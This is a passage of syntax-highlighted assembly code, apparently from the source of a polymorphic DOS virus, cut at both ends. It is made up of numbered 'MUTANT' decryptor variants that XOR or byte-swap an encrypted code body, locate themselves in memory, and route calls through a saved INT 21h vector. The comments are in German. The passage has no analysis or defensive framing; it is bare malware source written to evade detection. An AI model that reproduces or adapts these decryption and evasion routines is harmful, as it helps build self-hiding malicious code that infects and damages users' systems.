                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc2">008Eh</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J04072</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_entry</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc5">mut_14</span><span class="sc0">

</span><span class="sc5">J0406E</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
</span><span class="sc5">J0406F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
</span><span class="sc5">J04072</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 10)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_10</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J0408F</span><span class="sc0">

</span><span class="sc5">J04079</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
</span><span class="sc5">J0408A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J0408B</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J040A2</span><span class="sc0">

</span><span class="sc5">J0408F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04079</span><span class="sc0">
                </span><span class="sc6">CLC</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0408F</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc8">BP</span><span class="sc0">           </span><span class="sc1">; CALL Int 21H</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">
</span><span class="sc5">J040A2</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J040A5</span><span class="sc0">
</span><span class="sc5">J040A5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2384h</span><span class="sc0">        </span><span class="sc1">; CX = 2384</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX = 40A5</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23B6h</span><span class="sc0">        </span><span class="sc1">; BX = 1cef</span><span class="sc0">
</span><span class="sc5">J040AD</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04079</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J040AD</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">008Fh</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J0408A</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
</span><span class="sc5">J040BB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc4">,</span><span class="sc5">mut_10</span><span class="sc0">
                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">089h</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 29)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">Mut_29</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J040DB</span><span class="sc0">

</span><span class="sc5">J040C4</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AH</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc5">J040D6</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">RETN</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J040D7</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J040F0</span><span class="sc0">

</span><span class="sc5">J040DB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J040C4</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J040DB</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D259A</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D259A</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CALL INT 21H</span><span class="sc0">
</span><span class="sc5">J040F0</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J040F3</span><span class="sc0">
</span><span class="sc5">J040F3</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">23B8h</span><span class="sc0">                </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2384h</span><span class="sc0">                </span><span class="sc1">; CX = 2384</span><span class="sc0">
</span><span class="sc5">J040FB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J040C4</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J040FB</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">008Fh</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">JZ</span><span class="sc0">      </span><span class="sc5">J040D6</span><span class="sc0">
</span><span class="sc5">J04107</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">29</span><span class="sc4">,</span><span class="sc5">mut_29</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 15)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_15</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">J04111</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">DH</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DH</span><span class="sc4">,</span><span class="sc8">DL</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J04111</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04128</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J04123</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J04126</span><span class="sc0">
</span><span class="sc5">J04126</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J04135</span><span class="sc0">

</span><span class="sc5">J04128</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; CALL INT 21</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04123</span><span class="sc0">

</span><span class="sc5">J04135</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc5">Code_Len</span><span class="sc0">        </span><span class="sc1">; CX = 2385</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">239Fh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc5">J0413F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,[</span><span class="sc8">BX</span><span class="sc4">-</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">LOOP</span><span class="sc0">    </span><span class="sc5">J0413F</span><span class="sc0">
                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc2">008Eh</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04151</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J04151</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">,</span><span class="sc5">mut_15</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;=====================================================( MUTANT #6 )===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_6</span><span class="sc0">           </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
</span><span class="sc5">J0415A</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">67h</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0415A</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J04172</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J0416F</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J041A1</span><span class="sc0">
</span><span class="sc5">J04172</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; == call Int 21</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J0416F</span><span class="sc0">

</span><span class="sc5">J04178</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">        </span><span class="sc1">; AX = 0002</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DD61h</span><span class="sc0">       </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc0">              </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">2184h</span><span class="sc0">        </span><span class="sc1">; CX = 2184</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; CX = 2386</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc5">J04188</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">67h</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; Jedes 2 byte verXORen</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J04188</span><span class="sc0">          </span><span class="sc1">; 11C3 (!!!) mal :)</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">008Fh</span><span class="sc0">        </span><span class="sc1">; BX =</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">]</span><span class="sc1">;</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J0419C</span><span class="sc0">           </span><span class="sc1">; &lt;- BX+8E</span><span class="sc0">
                </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc5">J0419C</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
                </span><span class="sc5">JMP_ENTRY</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">,</span><span class="sc5">mut_6</span><span class="sc0">

</span><span class="sc5">J041A1</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J04178</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc1">;====================================================( MUTANT # 25)===</span><span class="sc0">
</span><span class="sc1">;=====================================================================</span><span class="sc0">
</span><span class="sc5">mut_25</span><span class="sc0">          </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">                      </span><span class="sc1">; = OFFSET 4BB5</span><span class="sc0">
</span><span class="sc5">J041A5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">Ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,+</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">J041A5</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">@INT21</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc5">D2598</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc9">SHORT</span><span class="sc0"> </span><span class="sc5">J041BE</span><span class="sc0">

        </span><span class="sc1">;-------( einsprung )--------------</span><span class="sc0">
</span><span class="sc5">J041BB</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">J041EC</span><span class="sc0">
</span><span class="sc5">J041BE</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">D2598</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">J041BB</span><span class="sc0">

</span><span class="sc5">J041C5</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">       </span><span class="sc1">; AX = 2,BX =</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0DC61h</span><span class="sc0">      </span><span class="sc1">; BX =</span><span class="sc0">
